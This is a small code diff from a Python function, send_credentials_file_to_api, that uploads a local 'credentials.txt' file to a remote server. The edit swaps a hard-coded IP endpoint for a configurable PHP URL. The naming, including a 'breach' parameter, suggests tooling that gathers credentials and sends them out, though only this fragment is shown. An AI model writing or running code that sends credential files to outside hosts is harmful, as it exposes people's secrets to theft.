@@ -358,7 +358,7 @@ def send_credentials_file_to_api(project_id, file_path='credentials.txt', breach
             'X-API-Key': API_KEY
         }
 
-        server_url = "https://100.20.158.40/api/routes/credentials"
+        server_url = f"{API_BASE_URL}credentials.php"
         
         print(f"📤 Sending credentials file to: {server_url}")
         print(f"📁 File: {file_path}")
